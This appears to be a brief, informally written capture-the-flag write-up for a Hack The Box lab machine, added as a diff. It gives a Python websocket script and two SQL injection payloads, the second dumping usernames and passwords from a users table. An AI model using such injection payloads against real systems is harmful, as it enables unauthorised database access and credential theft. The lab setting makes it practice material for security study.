@@ -1,0 +1,28 @@
+there was a app for linux o the site we used ==pyixs...py== to get the source code and
+
+it gave us the hint for sqli
+
+we tried the script like ==soccer== htb not it took too toot too much time
+
+so
+
+```
+#!/usr/bin/python3
+import sys
+import websocket
+import json
+
+VERSION='0.0.2'
+ws = websocket.WebSocket()
+ws.connect("ws://ws.qreader.htb:5789/version")
+ws.send(json.dumps({'version': sys.argv[1]}))
+print(ws.recv())
+```
+
+run it
+
+python3 ws_socket.py '0.0.2" union select 1,2,3,4-- -'
+
+python3 ws_socket.py '0.0.2" union select username,password,3,4 from users-- -'
+
+root was simple
